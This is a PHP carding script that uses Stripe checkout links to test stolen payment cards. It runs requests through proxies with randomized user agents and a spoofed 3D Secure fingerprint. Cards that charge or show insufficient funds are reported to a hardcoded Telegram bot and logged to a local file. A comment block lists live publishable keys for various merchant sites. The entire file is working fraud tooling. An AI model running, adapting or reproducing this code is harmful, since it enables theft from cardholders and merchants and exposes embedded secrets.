<?php
include 'config.php';
if (!isset($_GET['referrer']) || $_GET['referrer'] != "Auth") {
    $i = rand(0,sizeof($red_link)-1);
    header("location: $red_link[$i]");
    exit();
}

// SET YOUR COOKIES
if (!is_dir("cookies")) {
    mkdir("cookies");
}
$cookies = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "fluffymallows" . rand(10000, 9999999) . ".txt";
$cookietempfile = fopen($cookies, 'w+');
fclose($cookietempfile);

///---- Stripe Checkout API by Chillz ----///
/// Supported websites ////
///// pk_live_51GjnvOEtynl19Eg2AOFRLLS54B2hzHZvHVgadRoeO1hZsMbvhZ54lzfRQsLVzXB7rvCeB1l7plSXA3mVqQJa1L1P008HUtbtyF - SMS pool
///// pk_live_51KigCwEVzZTm6CjTuQ88HgC13eLdzKqnwP5mUd9gpWyWXAqVnmuw0XXvgc7wAkZKpmyGXxC9dqAf3O63n6LU2hEx00ooOyDv8v - SMS active
///// pk_live_51IXC1AJY8rQ0RqGBi27Tpwu60xUKbJpFIcSsv9f30LNn4UwmGTMfB2c7suXuJe3yKQzyCPjGvxs16N4ESUJT4d2Z00iEuFJXvf - solve captcha (need manual burp not working on script)
////// pk_live_VFQFgOs5fhg9cjAohB05ZhdQ - giftgo now
///// pk_live_Wk94I65ZReejiPdoFfUrNIyV00szE3z6vP - Cloudary
///// pk_live_51In2OQF6KbQh44q11COsLzIbvnPzOdzg6WIOXQHDFMm9TnI4pjt1tJm9V6tulgkaBozAHONpUdjLHJeJDW1rxneD001MeE6VpM - susschegg
///// pk_live_51HKJ66L4al9TyiSIncgm7UUrtiBGLzeJoYBJuECYRyVYR8pxkvLBeXnMr5s4tXhzVgqMzsPBo8v6qFzcO6quYwW0006y19HjAj - Omlet Plus
///// pk_live_T5j5vpjgnfBOiHyqWwfFqRmm - CLoudzy
//// pk_live_on2DxFdzeJsK590OiyjDxSCp00cAJzXqzg - latium
//// pk_live_51HgodtGRvHz7HxXDZGoHvg6LA2ETexYxMH2A4LYbNN8n6lqzGuk3CkdrHWFQ3P3B7Dh448mBs6OJnpIFl7V9sgYD00FLvhh9TB - hydra proxy
//// pk_live_51Fh50mKgip3ZsdRxdFMOmmTOBfXrOZx6gqRIIL7OwAMT6IvXgbOy6xKDjlfjt7PA3ct1lyajgaHKA0f4tUitVYma00bQjoMflK - proxiware
//// pk_live_51LL4cJEbMs4mY7FHrEWwonoQKaq8FjsFsm3ViqWxQBQPy1OdWdAM5h5MjbahLSAKwfFCm6HowgBySE9u7vz1bncZ007jhAn3Z3 - opt pay
//// pk_live_zLfmlDVbFZvKKplI9fxUCkKb00yl0v7IWI - unknown proxies
//// pk_live_51HOnXTFcVrrz5cZoAPMsnd7Ut8EhJExnWYQEVfaxnZDx9z4cTomieeMEpgJGOKtgZNMRLcDLP0LmVh0JVBPjRgtb00DKRi4Iig - Copy AI
//// pk_live_51K52NcAK9pkzffxSxhr2maH3LCInmtpRdRDjFcmo53fqFIGq4280p0lYZ4BzYOy4kX0J21Vl6aeVid8tZYtMGAhJ00RHNviPRQ - top up.cc
//// pk_live_51HYse1Ku89xKyUttaoUeH6XxJ5cGYzOAKYis4UpE1rBmCxI8Hb3GYoc4qE9IUJgbavk3GITTEczZXMEJ6HDshNKS007nZqvvnt - spotify.ax

error_reporting(0);

$checkoutlink = $_GET['colink'];
$colink = $checkoutlink;

$obfuscatedPK = urldecode(explode("#", $colink)[1]);
$deobfed = '';

$decoded = base64_decode($obfuscatedPK);

for ($i = 0; $i < strlen($decoded); $i++) {
    $deobfed .= chr(5 ^ ord($decoded[$i]));
}

$shuroap = json_decode($deobfed, 1);
$pk = $shuroap['apiKey'];
//echo "$pk<br>";
$sec = g($colink, '/pay/', '#');
//echo "$sec<br>";
$amt = $_GET['cst'];
if (empty($_GET['xemail'])) {
    $email = 'marssh_autoco' . rand(000000, 999999) . '@gmail.com';
    $xmail = str_replace('@', '%40', $email);
} elseif (!empty($_GET['xemail'])) {
    $email = $_GET['xemail'];
    $xmail = str_replace('@', '%40', $email);
}

$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$proxy = ''.$ip.'';
$proxyauth = ''.$hydra.'';

list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['lista']));
$scc = implode('+', str_split($cc, 4));
$m = ltrim($mm, "0"); $mm === "10" ? $m = "10" : $mm;
strlen($yyyy) == 2 ? $yyyy = '20' . $yyyy : null; $yy = substr($yyyy, 2,2);
$card = "$cc|$mm|$yy|$cvv";
$type = $cc[0] == '4' ? 'Visa' : 'Mastercard'; 


function g($str, $start, $end, $decode=false){   
    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
  }

function c($l){
    $x = '0123456789abcdefghijklmnopqrstuvwxyz';
    $y = strlen($x);
    $z = '';
  
  for ($i=0; $i<$l ; $i++) { 
   $z .= $x[rand(0, $y - 1)];
  }
    return $z;
  } 

$guid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$muid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);

if(!is_dir("cookies")) mkdir("cookies");
$cookies = getcwd()."/cookies/chillz".rand(10000, 9999999).".txt";


$mask = substr_replace($cc,'xxxxxxxxxx',0,10);
$extrap = $mask."|".$mm."|".$yy;
$extrap;
///////////////=============================////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $ip = curl_exec($ch);
 curl_close($ch);

$ips = g($ip,'"query":"','"');
$ip_countryflag = json_decode($ip, true)['countryCode'];
$ip_countryname = json_decode($ip, true)['country'];
if (!empty($ips)) {
    $myip = "<font class='text-black'>$ips ($ip_countryname)</font><br>";
} else {
$myip = "";
}
echo $myip;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/init');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pk.'&eid=NA&browser_locale=en-GB&redirect_type=url');
$curl = curl_exec($ch);
curl_close($ch);
 $curl;
 $amttt = g($curl,'"unit_amount_decimal": "','"');
 $currency = g($curl,'"currency": "','"');
 $sessionstatus = json_decode($curl, true)['error']['message'];
 $paymentname1 = json_decode($curl, true)['account_settings']['display_name'];
 $paymentname2 = json_decode($curl, true)['account_settings']['display_name'];
 $cancelurl1 = json_decode($curl, true)['cancel_url'];
 $cancelurl2 = json_decode($curl, true)['cancel_url'];
 if (!empty($cancelurl1)) {
    $cancelurl1 = "🙅‍♂️ Return URL: [click here](".urldecode($cancelurl1).")\r\n";
 } else {
    $cancelurl1 = "";
 }
 if (!empty($cancelurl2)) {
    $cancelurl2 = "🙅‍♂️ Return URL: [".urldecode($cancelurl2)."](".urldecode($cancelurl2).")\r\n";
 } else {
    $cancelurl2 = "";
 }
 if (!empty($paymentname1)) {
    $paymentname1 = "🛒 Merchant: $paymentname1\r\n$cancelurl1";
} else {
    $paymentname1 = "";
}
 if (!empty($paymentname2)) {
    $paymentname2 = "🛒 Merchant: $paymentname2\r\n$cancelurl2";
} else {
    $paymentname2 = "";
}
if (empty($curl)) {
    echo "";
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');

curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
if($_GET['gate'] === '1') {
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]=MARSSH+AUTOCO&billing_details[email]='.$xmail.'&billing_details[address][country]=PH&billing_details[address][line1]=Malvr&billing_details[address][city]=Manila&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
} elseif($_GET['gate'] === '2') {
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]=MARSSH+AUTOCO&billing_details[email]='.$xmail.'&billing_details[address][country]=PH&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2Fb94a554920%3B+stripe-js-v3%2Fb94a554920%3B+checkout');
}
$pm = curl_exec($ch);
curl_close($ch);
$id = g($pm, '"id": "','"');





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/confirm');

curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount='.$amttt.'&last_displayed_line_item_group_details[subtotal]='.$amttt.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pk.'');
$ppage2 = curl_exec($ch);
curl_close($ch);
$client_secret = g($ppage2, '"client_secret": "','"');
$xplode = explode('_secret', $client_secret);
$pi = $xplode[0];
$three_d = g($ppage2, '"three_d_secure_2_source": "','",');
$message = g($ppage2, '"message": "','"');
$success = g($ppage2, '"success_url": "','"');





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');

curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$three_d.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImY2NjQ4NWVmLTQ1ZjItNDEyZi05Y2I3LWE5ZGFhMTE0MTY2ZCJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22851%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+M2010J19CG)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F108.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pk.'');
$authenticate = curl_exec($ch);
curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pk.'&is_stripe_sdk=false&client_secret='.$client_secret.'');

curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$final = curl_exec($ch);
$dcode2 = json_decode($final)->last_payment_error->decline_code;
$msg = json_decode($final)->last_payment_error->message;
$status = g($final, '"status": "','"');
$dcode = g($final, '"decline_code": "','"');
curl_close($ch);
sleep(5);

#############SET DESTINATION OF YOUR TG BOT
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('5921984241:AAFYOOSQ9a4CKeCMdHGtsAIoxTzuhjhOits');
$chatID = urlencode('-1001968556590');
$amttt = intval($amttt)/100;
if (!empty($proxy) || !empty($proxyauth)) {
    $proxyinfo = "🌐 PROXY USED\r\n➤ Ip & Port\r\n`$proxy`\r\n➤ Credentials\r\n`$proxyauth`\r\n➤ Country\r\n$ip_countryname\r\n\n";
} else {
    $proxyinfo = "➤ Country\r\n$ip_countryname\r\n\n";
}

#############SEND TO TG BOT WHEN CHARGED
$charged_message = "Successful Checkout\r\n\n".$paymentname1."💳 BIN:\r\n`$card`\r\n💰 Amount: ".strtoupper($currency)." $amttt\r\n💸 Success URL: [".urldecode($success)."](".urldecode($success).")\r\n\n" . $proxyinfo . "☑️ Checked from:\r\n*$domain*";
$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&message_thread_id=15877&text='.urlencode($charged_message).'&parse_mode=markdown';

#############SEND TO TG BOT WHEN INSUFFBAL
$insuf_message = "Insufficient Funds\r\n\n".$paymentname2."💳 BIN: `$card`\r\n💰 Amount to bill: ".strtoupper($currency)." $amttt\r\n🔗 Stripe Checkout link: [click here](".urldecode($colink).")\r\n\n" . $proxyinfo . "☑️ Checked from:\r\n*$domain*";
$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&message_thread_id=15886&text='.urlencode($insuf_message).'&parse_mode=markdown';
    
#############BOT RETRY TO SEND IF ITS NOT WORKS
$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;

/////////===================/////////////////
if (strpos($final, '"status": "succeeded"')) {
    while (!$sendchargedtotg && $num_retries < $max_retries) {
    $sendchargedtotg = @file_get_contents($sendcharged);
    $num_retries++;
    echo '<font color=green>CHARGED</span>  </span>:  '.$extrap.'|'.$mm.'|'.$yy.'</span>  <br>➤ Payment Successful  <br>➤ Amount : '.strtoupper($currency).' '.$amttt.' <br> ➤ Invoice : <a href="'.urldecode($success).'">here</a><br>➤ Checked by '.$domain.'<br>';
    fwrite(fopen('kagebunshin-ninjuts-cc.txt', 'a'), $card."\r\n");
    }
exit();
}
elseif(strpos($final, '"insufficient_funds"')) {
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
 echo "<font color=green><b>CVV $card<br>insufficient_funds<br>";
    }
}
elseif(strpos($ppage2, '"insufficient_funds"')) {
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
 echo "<font color=green><b>CVV $card<br>insufficient_funds<br>";
    }
}
elseif(strpos($pm, '"insufficient_funds"')) {
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
 echo "<font color=green><b>CVV $card<br>insufficient_funds<br>";
    }
}
elseif(strpos($ppage2, '"type": "intent_confirmation_challenge"')){
   
    echo "<font color=red>DEAD  [$card]<br>[$dcode : $status : $dcode] [Hcaptcha (Proxy Recomended)]<br>";
}
elseif(strpos($ppage2, '"message": "Your payment has already been processed."')){
    echo "<font color=red>DEAD  [$card]<br>[$dcode : $status : $dcode] [EXPIRED LINK]<br>";
}
elseif($status == "requires_action"){
    echo "<font color=red>DEAD  [$card]<br>[$dcode : $status : $dcode] [OTP/VBV]<br>";
}
elseif(strpos($ppage2, '"status": "requires_action"')){
    echo "<font color=red>DEAD  [$card]<br>[$dcode : $status : $dcode] [OTP/VBV]<br>"; 
}
elseif(strpos($ppage2, '"decline_code": "generic_decline"')){
    echo "<font color=red>DEAD  [$card]<br>[$dcode] [generic_decline]<br>"; 
    
}
elseif(strpos($pm, '"decline_code": "generic_decline"')){
    echo "<font color=red>DEAD  [$card]<br>[$dcode] [generic_decline]<br>"; 
}
elseif(strpos($ppage2, '"message": "An error has occurred confirming the Checkout Session."')){
    echo "DEAD => $card => $status => $dcode <b> CHECK YOUR PK CS EMAIL IF CORRECT</b> => Payment Failed<br>";
    
    
}
else {
echo "<font color=red>DEAD  [$card]<br>[$code $decline_code $status  $msg $dcode2 -$message $dcode]<br>Try to switch GATE if one of the gates not work<br>"; 
    
    
}

// DELETE COOKIES AT IBA PANG MGA LIBAG
if (is_file($cookies) && is_writable($cookies)) {
    unlink($cookies);
    unset($ch);
    flush();
    ob_flush();
    ob_end_flush();
}

// DELETE ALL TYPE OF FILES SA COOKIES FOLDER
$dir = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR;
$files = glob($dir . "*"); // get all files in the directory

foreach($files as $file) {
    if(is_file($file)) { // make sure it's a file and not a directory
        unlink($file); // delete the file
    }
}

?>

